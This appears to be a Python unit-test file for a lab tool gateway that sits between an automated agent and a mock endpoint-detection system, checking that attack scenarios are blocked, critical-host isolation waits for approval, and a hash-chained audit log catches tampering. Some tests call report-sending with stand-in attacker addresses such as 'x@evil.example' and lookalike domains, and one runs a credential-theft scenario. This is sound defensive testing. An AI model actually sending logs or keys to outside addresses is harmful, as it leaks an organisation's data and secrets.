import tempfile
import unittest
from pathlib import Path

from lab.audit import AuditLog
from lab.edr import MockEDR
from lab.gateway import ALLOWED, BLOCKED, PENDING, DirectTools, Policy, ToolGateway
from lab.scenarios import SCENARIOS, outcome, run

KEY = "edr-lab-key-123"


class GatewayTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.audit = AuditLog(Path(self.tmp.name) / "audit.jsonl")
        self.edr = MockEDR(KEY)
        self.gw = ToolGateway(self.edr, KEY, self.audit)

    def tearDown(self):
        self.tmp.cleanup()

    def test_every_attack_stopped_and_legit_triage_works(self):
        for s in SCENARIOS:
            with self.subTest(s.key):
                gw = ToolGateway(MockEDR(KEY), KEY, self.audit)
                expected = "WORKS" if s.key == "legit" else "STOPPED"
                self.assertEqual(outcome(s, run(s, gw)), expected)

    def test_every_attack_succeeds_without_gateway(self):
        for s in SCENARIOS:
            if s.key != "legit":
                with self.subTest(s.key):
                    self.assertEqual(outcome(s, run(s, DirectTools(MockEDR(KEY), KEY))), "SUCCEEDED")

    def test_blocked_actions_never_reach_the_edr(self):
        self.gw.call("isolate_host", {"host": "dc01", "alert_id": "ALR-1002", "reason": "x"})
        self.gw.call("send_report", {"to": "x@evil.example", "body": "logs"})
        self.assertEqual(self.edr.isolated, [])
        self.assertEqual(self.edr.outbox, [])

    def test_critical_asset_goes_to_approval_queue(self):
        self.edr.alerts["ALR-1002"]["host"] = "dc01"  # a genuine alert on the domain controller
        r = self.gw.call("isolate_host", {"host": "dc01", "alert_id": "ALR-1002", "reason": "x"})
        self.assertEqual(r["status"], PENDING)
        self.assertEqual(len(self.gw.approval_queue), 1)
        self.assertEqual(self.edr.isolated, [])

    def test_isolation_limit(self):
        for i, host in enumerate(["ws-042", "ws-043", "ws-107"]):
            self.edr.alerts["ALR-1004"]["host"] = host
            r = self.gw.call("isolate_host", {"host": host, "alert_id": "ALR-1004", "reason": "x"})
            self.assertEqual(r["status"], ALLOWED if i < Policy.max_isolations_per_run else BLOCKED)
        self.assertEqual(self.edr.isolated, ["ws-042", "ws-043"])

    def test_closed_alert_cannot_justify_isolation(self):
        self.gw.call("close_alert", {"alert_id": "ALR-1004", "verdict": "benign"})
        r = self.gw.call("isolate_host", {"host": "ws-042", "alert_id": "ALR-1004", "reason": "x"})
        self.assertEqual(r["status"], BLOCKED)

    def test_true_positive_closure_needs_no_approval(self):
        r = self.gw.call("close_alert", {"alert_id": "ALR-1003", "verdict": "true_positive"})
        self.assertEqual(r["status"], ALLOWED)

    def test_rejects_malformed_arguments(self):
        for args in (None, ["ALR-1001"], {"alert_id": 1001}, {"alert_id": "ALR-1001\n"}, {}):
            with self.subTest(args=args):
                self.assertEqual(self.gw.call("get_alert", args)["status"], BLOCKED)

    def test_rejects_lookalike_report_domains(self):
        for to in ("soc@corp.lab.evil.example", "soc@evilcorp.lab", "soc@corp.lab@evil.example"):
            with self.subTest(to=to):
                self.assertEqual(self.gw.call("send_report", {"to": to, "body": "x"})["status"], BLOCKED)

    def test_gateway_results_never_contain_the_key(self):
        s = next(s for s in SCENARIOS if s.key == "credential-theft")
        self.assertNotIn(KEY, repr(run(s, self.gw)))
        self.assertNotIn(KEY, self.audit.path.read_text(encoding="utf-8"))


class AuditTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.log = AuditLog(Path(self.tmp.name) / "audit.jsonl")
        for i in range(3):
            self.log.append(tool="get_alert", status="allowed", n=i)

    def tearDown(self):
        self.tmp.cleanup()

    def lines(self):
        return self.log.path.read_text(encoding="utf-8").splitlines()

    def write(self, lines):
        self.log.path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    def test_intact_chain_verifies(self):
        self.assertEqual(self.log.verify(), (True, None))

    def test_edited_entry_detected(self):
        lines = self.lines()
        lines[1] = lines[1].replace('"allowed"', '"blocked"')
        self.write(lines)
        self.assertEqual(self.log.verify(), (False, 2))

    def test_deleted_entry_detected(self):
        lines = self.lines()
        del lines[1]
        self.write(lines)
        self.assertEqual(self.log.verify(), (False, 2))


if __name__ == "__main__":
    unittest.main()
